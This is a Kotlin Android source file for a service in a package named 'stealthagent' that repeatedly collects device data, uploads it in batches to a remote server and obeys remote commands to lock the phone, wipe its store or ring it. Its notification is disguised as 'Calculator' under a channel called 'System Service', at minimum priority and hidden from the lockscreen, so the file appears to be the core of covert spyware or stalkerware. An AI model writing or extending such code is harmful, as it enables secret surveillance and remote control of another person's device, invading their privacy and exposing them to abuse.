package com.stealthagent.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.admin.DevicePolicyManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.media.RingtoneManager
import android.os.BatteryManager
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.stealthagent.collector.AllCollectors
import com.stealthagent.data.AgentRepository
import com.stealthagent.model.CommandRequest
import com.stealthagent.network.AgentClient
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class AgentForegroundService : LifecycleService() {

    companion object {
        private const val CHANNEL_ID = "agent_bg"
        private const val NOTIFICATION_ID = 9010
        private const val NORMAL_INTERVAL = 60_000L
        private const val LOW_BATTERY_INTERVAL = 180_000L
        private const val UPLOAD_INTERVAL = 120_000L

        var isRunning = false; private set

        fun start(context: Context) {
            context.startForegroundService(Intent(context, AgentForegroundService::class.java))
        }
        fun stop(context: Context) {
            context.stopService(Intent(context, AgentForegroundService::class.java))
        }
    }

    @Inject lateinit var repository: AgentRepository
    @Inject lateinit var collectors: AllCollectors
    @Inject lateinit var client: AgentClient

    private var collectJob: Job? = null
    private var uploadJob: Job? = null
    private var commandJob: Job? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        runCatching {
            createChannel()
            startForeground(NOTIFICATION_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
        }.onFailure {
            stopForeground(STOP_FOREGROUND_REMOVE); stopSelf(); return START_NOT_STICKY
        }
        isRunning = true
        startCollectLoop()
        startUploadLoop()
        startCommandLoop()
        return START_STICKY
    }

    private fun startCollectLoop() {
        collectJob?.cancel()
        collectJob = lifecycleScope.launch {
            while (isActive) {
                runCatching { collectors.collectAll() }
                delay(getInterval())
            }
        }
    }

    private fun startUploadLoop() {
        uploadJob?.cancel()
        uploadJob = lifecycleScope.launch {
            while (isActive) {
                delay(UPLOAD_INTERVAL)
                runCatching {
                    val unsent = repository.getUnsent()
                    if (unsent.isNotEmpty() && repository.isPaired) {
                        if (client.uploadBatch(unsent)) {
                            repository.markUploaded(unsent.map { it.id })
                            repository.setLastSync(System.currentTimeMillis())
                        }
                    }
                    repository.pruneOldEvents()
                }
            }
        }
    }

    private fun startCommandLoop() {
        commandJob?.cancel()
        commandJob = lifecycleScope.launch {
            while (isActive) {
                if (repository.isPaired) {
                    runCatching {
                        client.listenForCommands { cmd -> handleCommand(cmd) }
                    }
                }
                delay(5_000) // reconnect backoff
            }
        }
    }

    private fun handleCommand(cmd: CommandRequest) {
        when (cmd.type) {
            "lock_device" -> lockDevice()
            "wipe_vault" -> lifecycleScope.launch {
                repository.wipe()
                stopSelf()
            }
            "ring" -> ringDevice()
        }
    }

    private fun lockDevice() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
        if (dpm?.activeAdmins?.isNotEmpty() == true) runCatching { dpm.lockNow() }
    }

    private fun ringDevice() {
        runCatching {
            val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            RingtoneManager.getRingtone(applicationContext, uri)?.play()
        }
    }

    private fun getInterval(): Long {
        val bi = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = bi?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = bi?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
        val pct = if (scale > 0) (level * 100) / scale else 100
        return if (pct <= 20) LOW_BATTERY_INTERVAL else NORMAL_INTERVAL
    }

    override fun onDestroy() {
        isRunning = false
        collectJob?.cancel()
        uploadJob?.cancel()
        commandJob?.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent): IBinder? { super.onBind(intent); return null }

    private fun createChannel() {
        val ch = NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN).apply {
            setShowBadge(false); lockscreenVisibility = Notification.VISIBILITY_SECRET
        }
        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentTitle("Calculator").setContentText("Running")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET).setOngoing(true).build()
}
